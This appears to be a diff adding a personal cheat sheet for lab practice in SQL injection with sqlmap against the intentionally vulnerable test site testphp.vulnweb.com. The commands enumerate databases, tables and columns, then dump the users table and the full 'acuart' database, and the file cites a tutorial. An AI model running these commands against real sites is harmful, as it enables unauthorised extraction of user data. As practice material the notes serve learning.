@@ -1,0 +1,17 @@
+URL = http://testphp.vulnweb.com/artists.php?artist=1
+
+Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+Result is DB name acuart
+
+Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
+Result is table name users
+
+Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
+
+Reference = https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
